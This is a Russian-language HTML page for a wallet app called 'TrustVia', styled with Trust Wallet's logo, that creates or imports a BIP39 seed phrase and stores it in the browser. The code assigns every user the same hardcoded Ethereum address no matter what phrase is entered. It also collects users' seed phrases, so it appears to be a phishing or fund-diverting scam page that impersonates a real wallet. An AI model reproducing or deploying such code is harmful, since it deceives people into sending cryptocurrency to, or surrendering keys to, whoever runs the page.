<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TrustVia — Вход</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/bip39@3.1.0/index.min.js"></script>
    <style>
        body { background: linear-gradient(to bottom, #0b0b0b, #121212); color: white; font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; min-height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 2rem; }
        .btn-primary { background: linear-gradient(135deg, #00d676, #00e07f); color: black; font-weight: 700; border-radius: 9999px; padding: 18px; width: 100%; font-size: 17px; border: none; cursor: pointer; transition: all 0.25s; box-shadow: 0 6px 20px rgba(0,214,118,0.35); }
        .btn-primary:active { transform: scale(0.97); }
        .btn-outline { border: 1px solid #444; color: #00d676; font-weight: 700; border-radius: 9999px; padding: 18px; width: 100%; font-size: 17px; background: transparent; cursor: pointer; transition: all 0.25s; }
        .btn-outline:active { background: rgba(0, 214, 118, 0.12); transform: scale(0.97); }
        textarea { background: #141414; border: 1px solid #444; color: white; border-radius: 24px; padding: 18px; font-family: monospace; font-size: 15px; resize: none; outline: none; transition: all 0.2s; height: 160px; width: 100%; }
        textarea:focus { border-color: #00d676; box-shadow: 0 0 0 3px rgba(0, 214, 118, 0.25); }
        .error-msg { color: #ff4d4d; font-size: 14px; margin-top: 10px; display: none; text-align: center; }
        .word-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; background: #111; padding: 20px; border-radius: 20px; border: 1px solid #222; margin: 24px 0; }
        .word-item { color: #ccc; font-size: 14px; font-family: monospace; text-align: center; padding: 10px; background: #1a1a1a; border-radius: 10px; }
        .back-btn { color: #00d676; font-weight: 600; font-size: 16px; background: none; border: none; padding: 0; margin-bottom: 24px; cursor: pointer; text-align: left; width: 100%; }
    </style>
</head>
<body>
    <div class="flex flex-col items-center mb-12 mt-10">
        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform_light.png" class="w-24 mb-6 animate-pulse" alt="TrustVia">
        <h1 class="text-5xl font-extrabold tracking-tight bg-gradient-to-r from-[#00d676] to-[#00e07f] bg-clip-text text-transparent">TrustVia</h1>
        <p class="text-zinc-400 mt-3 text-lg">Ваш Ethereum кошелёк</p>
    </div>

    <div class="w-full max-w-md space-y-5">
        <button onclick="createWallet()" class="btn-primary uppercase tracking-widest py-6 shadow-lg">Создать новый кошелёк</button>
        <button onclick="importWallet()" class="btn-outline uppercase tracking-widest py-6">Импортировать кошелёк</button>
    </div>

    <!-- Создание -->
    <div id="create-section" style="display:none; width:100%; max-width:24rem; margin-top:2rem;">
        <button class="back-btn" onclick="document.getElementById('create-section').style.display='none'">← Назад</button>
        <h2 class="text-2xl font-bold mb-4 text-center">Ваша секретная фраза</h2>
        <p class="text-zinc-400 mb-6 text-center">Запишите эти слова в правильном порядке и храните в безопасном месте!</p>
        <div id="word-grid" class="word-grid"></div>
        <button onclick="handleCreate()" class="btn-primary mt-6 uppercase tracking-wider py-5">Я записал фразу</button>
    </div>

    <!-- Импорт -->
    <div id="import-section" style="display:none; width:100%; max-width:24rem; margin-top:2rem;">
        <button class="back-btn" onclick="document.getElementById('import-section').style.display='none'">← Назад</button>
        <h2 class="text-2xl font-bold mb-4 text-center">Импорт кошелька</h2>
        <textarea id="phraseInput" placeholder="Введите 12 или 24 слова через пробел..."></textarea>
        <p id="import-error" class="error-msg"></p>
        <button onclick="handleImport()" class="btn-primary mt-6 uppercase tracking-wider py-5">Восстановить кошелёк</button>
    </div>

    <script>
        function createWallet() {
            const mnemonic = bip39.generateMnemonic();
            const words = mnemonic.split(' ');
            let html = '';
            words.forEach((word, i) => {
                html += `<div class="word-item">${i+1}. ${word}</div>`;
            });
            document.getElementById('word-grid').innerHTML = html;
            document.getElementById('create-section').style.display = 'block';
            localStorage.setItem('tempMnemonic', mnemonic);
        }

        function importWallet() {
            document.getElementById('import-section').style.display = 'block';
        }

        function handleCreate() {
            if (!confirm('Вы точно записали все слова? Это последний шанс увидеть фразу!')) return;
            localStorage.setItem('mnemonic', localStorage.getItem('tempMnemonic'));
            localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
            window.location.href = 'index.html';
        }

        function handleImport() {
            const phrase = document.getElementById('phraseInput').value.trim();
            const errorEl = document.getElementById('import-error');
            errorEl.style.display = 'none';

            if (!phrase) {
                errorEl.textContent = 'Введите фразу';
                errorEl.style.display = 'block';
                return;
            }

            const words = phrase.split(/\s+/).filter(w => w);
            if (words.length !== 12 && words.length !== 24) {
                errorEl.textContent = 'Должно быть 12 или 24 слова';
                errorEl.style.display = 'block';
                return;
            }

            if (!bip39.validateMnemonic(phrase)) {
                errorEl.textContent = 'Неверная фраза';
                errorEl.style.display = 'block';
                return;
            }

            if (!confirm('Вы уверены? Это восстановит доступ к кошельку.')) return;

            localStorage.setItem('mnemonic', phrase);
            localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
            window.location.href = 'index.html';
        }
    </script>
</body>
</html>
